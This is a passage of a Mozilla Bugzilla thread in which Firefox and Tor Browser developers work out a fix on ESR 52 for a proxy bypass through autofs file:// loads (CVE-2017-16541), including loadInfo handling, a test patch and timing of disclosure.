&gt; &gt; This looks promising. However, I am not exactly sure that we have all the
&gt; &gt; necessary things ready at this point looking at ESR 52 code. It seems to me
&gt; &gt; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">bug 1319111</a> added all the changes you build upon. And backporting that one +
&gt; &gt; all the dependent bugs seems unrealistic. Am I missing something (and if not
&gt; &gt; what options do we have instead)?
&gt; 
&gt; I am adding Honza since he fixed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">Bug 1319111</a>. Anyway, we added the
&gt; triggeringPrincipal to the loadInfo within <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Add triggeringPrincipal to nsILoadInfo"
   href="/show_bug.cgi?id=1083422">Bug 1083422</a> [1], which landed for
&gt; FF35. In other words triggeringPrincipal information on the loadinfo for
&gt; subrequest loads should definitely be accurate for ESR52. I don't fully
&gt; understand why the final channel URL is important to fix the problem in this
&gt; bug. As I understand it, if mFileURI [2] would point to e.g. file:///net
&gt; then we would hit the network at the time we call ::init on nsFileChannel,
&gt; right? So I don't think <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">Bug 1319111</a> is relevant in any way for fixing this
&gt; bug. But maybe I am missing something here.</span >

Thanks. You probably don't. I was just wondering how to get the proper loadInfo in the constructor and how to abort properly before we hit the UDP leak.</pre></div><div class="change-set" id="c16"><div class="comment" data-id="12795659" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a30551_578488"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 04:59 PDT" data-time="1509105548">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-16" data-comment-id="12795659">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c15">comment #15</a>)
<span class="quote">&gt; Thanks. You probably don't. I was just wondering how to get the proper
&gt; loadInfo in the constructor and how to abort properly before we hit the UDP
&gt; leak.</span >

You can simply access the member mLoadInfo (which is the current loadinfo of the file channel). To abort the load I assume you can just return any NS_ERROR_*. (Maybe NS_ERROR_FILE_TARGET_DOES_NOT_EXIST). I looked at other code within the ::init() function and it seems simply returning an error is all there is to do (once we exactly know what condition for aborting is).</pre></div><div class="change-set" id="c17"><div class="comment" data-id="12795831" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 06:27 PDT" data-time="1509110835">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="12795831">(In reply to Christoph Kerschbaumer [:ckerschb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c16">comment #16</a>)
<span class="quote">&gt; (In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c15">comment #15</a>)
&gt; &gt; Thanks. You probably don't. I was just wondering how to get the proper
&gt; &gt; loadInfo in the constructor and how to abort properly before we hit the UDP
&gt; &gt; leak.
&gt; 
&gt; You can simply access the member mLoadInfo (which is the current loadinfo of
&gt; the file channel). To abort the load I assume you can just return any
&gt; NS_ERROR_*. (Maybe NS_ERROR_FILE_TARGET_DOES_NOT_EXIST). I looked at other
&gt; code within the ::init() function and it seems simply returning an error is
&gt; all there is to do (once we exactly know what condition for aborting is).</span >

Returning an error does not work as the compiler is complaining about doing so in a constructor. And just accessing `mLoadInfo` and doing things like you did in comment:10 (i.e. `mLoadInfo-&gt;TriggeringPrincipal()-&gt;GetIsCodebasePrincipal()`) does not work as `mLoadInfo` is `null` it seems (if I am doing a `if (mLoadInfo)` the code in the if-clause is never executed). So, what did you have in mind (sorry if I am not following)?</pre><div class="activity"><div class="change">Flags: needinfo?(ckerschb)</div></div></div><div class="change-set" id="c18"><div class="comment" data-id="12795930" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_4418" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/4febbd86c096511a281d5921a0fd3824?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_4418" id="a30551_578488"><a class="email " href="/user_profile?user_id=4418" > <span class="fna">Mark Smith [:mcs]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:09 PDT" data-time="1509113351">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-18" data-comment-id="12795930">I am not sure, but it might work to add the check suggested by Christoph to nsFileProtocolHandler::NewChannel2().</pre></div><div class="change-set" id="c19"><div class="comment" data-id="12795971" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a30551_578488"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:23 PDT" data-time="1509114231">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-19" data-comment-id="12795971">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c17">comment #17</a>)
<span class="quote">&gt; Returning an error does not work as the compiler is complaining about doing
&gt; so in a constructor. And just accessing `mLoadInfo` and doing things like
&gt; you did in comment:10 (i.e.
&gt; `mLoadInfo-&gt;TriggeringPrincipal()-&gt;GetIsCodebasePrincipal()`) does not work
&gt; as `mLoadInfo` is `null` it seems (if I am doing a `if (mLoadInfo)` the code
&gt; in the if-clause is never executed). So, what did you have in mind (sorry if
&gt; I am not following)?</span >

Well, this is what I had in mind actually. The loadInfo should not be null at this point. Can we figure out why it is null? As Mark suggested, first we could check that we get the required arguments within newChannel2(). But Maybe newChannel2 is not even called and the channel is created somehow different. Further down within the ::init() method, mLoadinfo is even accessed at the moment, so I am surprised it's null.

Regarding returning the error within the ::init() method, that should work, because there is already code that does the same. Or are you really trying to do it in the constructor and not the ::init() method?</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ckerschb)</span></div></div></div><div class="change-set" id="c20"><div class="comment" data-id="12795981" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a30551_578488"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:27 PDT" data-time="1509114477">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-20" data-comment-id="12795981">::Init starts with NS_ENSURE_STATE(mLoadInfo);, which looks like it verifies that mLoadInfo is not nullptr.</pre></div><div class="change-set" id="c21"><div class="comment" data-id="12796011" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:38 PDT" data-time="1509115084">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-21" data-comment-id="12796011">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c20">comment #20</a>)
<span class="quote">&gt; ::Init starts with NS_ENSURE_STATE(mLoadInfo);, which looks like it verifies
&gt; that mLoadInfo is not nullptr.</span >

I agree but we need ESR 52 code for Tor Browser and there is no such thing in nsFileChannel.cpp.[1] I tried to work with Christoph's code there which gave me the results I mentioned in comment:17 and made me wonder in comment:15.

[1] <a rel="nofollow" href="https://dxr.mozilla.org/mozilla-esr52/source/netwerk/protocol/file/nsFileChannel.cpp#253">https://dxr.mozilla.org/mozilla-esr52/source/netwerk/protocol/file/nsFileChannel.cpp#253</a></pre></div><div class="change-set" id="c22"><div class="comment" data-id="12796014" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a30551_578488"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:38 PDT" data-time="1509115124">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-22" data-comment-id="12796014">Ah, sorry, I missed the fact that we were talking about different versions.</pre></div><div class="change-set" id="c23"><div class="comment" data-id="12796059" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a30551_578488"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a30551_578488"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 07:53 PDT" data-time="1509116032">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-23" data-comment-id="12796059">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c20">comment #20</a>)
<span class="quote">&gt; ::Init starts with NS_ENSURE_STATE(mLoadInfo);, which looks like it verifies
&gt; that mLoadInfo is not nullptr.</span >

<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">Bug 1319111</a> rearranged things like this:


instead of...


channel = new nsFileChannen(url) {
  // the code we want to patch
}
channel-&gt;SetLoadInfo()


...it does...


channel = new nsFileChannel(url) : mURL(url) {}
channel-&gt;SetLoadInfo(loadinfo)
channel-&gt;Init() {
  // the code we want to patch
}


you don't need to bother with the new resultPrincipalURI (not on esr52).



Regarding the codebase principal check, you should ask Boris, but I think we only use codebase principal for thing we are about to load from unknown (and potentially unsafe) uris, but we may also use codebase principal for moz-extenstion (privileged, I think).

as I understand, we later block the load in CSP.  what exactly is the check doing?  could we move whole check or the part of it that detects the load blocking here?  to be on the safe side...</pre></div><div class="change-set" id="c24"><div class="comment" data-id="12796291" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 09:10 PDT" data-time="1509120658">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-24" data-comment-id="12796291">FWIW: I tested Christoph's patch in comment:10 in a Firefox 56 build and it solves the bug for me on Linux. I guess having a similar option for ESR 52 would be neat...</pre></div><div class="change-set" id="c25"><div class="comment" data-id="12796970" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 13:55 PDT" data-time="1509137709">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-25" data-comment-id="12796970">(In reply to Mark Smith (:mcs) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c18">comment #18</a>)
<span class="quote">&gt; I am not sure, but it might work to add the check suggested by Christoph to
&gt; nsFileProtocolHandler::NewChannel2().</span >

Partly, yes. The problems is that we hit the newChannel() call in `nsIOService::NewChannelFromURIWithProxyFlagsInternal()` without loadFlags. I guess what we can do is do just return an error in our case if we hit that part. I've implemented that in a patch and I don't see the proxy bypass on my Linux box anymore. mcs/arthur: could you verify that on OS X as well (see the attached patch; I could not give its final version a test yet as I blew my build away accidentally and need to make a full new one but am about to be afk)? Is there anything we'd blow up by deploying this workaround?</pre><div class="activity"><div class="change">Flags: needinfo?(arthuredelstein)</div></div></div><div class="change-set" id="c26"><div class="comment" data-id="12796980" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_578488" id="a30551_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 13:58 PDT" data-time="1509137885">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-26" data-comment-id="12796980">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c25">comment #25</a>)
<span class="quote">&gt; see the attached patch</span >

I don't think you attached anything</pre><div class="activity"><div class="change">Flags: needinfo?(gk)</div></div></div><div class="change-set" id="c27"><div class="comment" data-id="12796984" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 13:59 PDT" data-time="1509137948">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8922957"
         class="attachment patch"
         data-id="8922957" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="0001-Test-for-bug-1412081.patch">
      <meta itemprop="contentSize" content="1948">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8922957">
          <a class="link" href="attachment.cgi?id=8922957&amp;action=diff">
        <span id="att-8922957-description" itemprop="description">0001-Test-for-bug-1412081.patch</span></a>
        — <a href="attachment.cgi?id=8922957&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8922957">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-27" data-comment-id="12796984">Here comes the mentioned patch.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(gk)</span></div></div></div><div class="change-set" id="c28"><div class="comment" data-id="12796990" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 14:00 PDT" data-time="1509138008">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-28" data-comment-id="12796990">(In reply to Tom Ritter [:tjr] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c26">comment #26</a>)
<span class="quote">&gt; (In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c25">comment #25</a>)
&gt; &gt; see the attached patch
&gt; 
&gt; I don't think you attached anything</span >

Yeah, my browser crash while uploading, sorry.</pre><div class="activity"><div class="change">Flags: needinfo?(mcs)</div></div></div><div class="change-set" id="c29"><div class="comment" data-id="12797009" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 14:06 PDT" data-time="1509138387">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-29" data-comment-id="12797009">Dan, would it be okay if we released a new Tor Browser with a functional workaround before this bugs gets fixed properly by being as unspecific as possible in our announcement and just including the code without any comments etc.? This is a critical issue for us.</pre><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="a93004_75935"><div class="change" id="aa93004_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a93004_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a93004_75935"
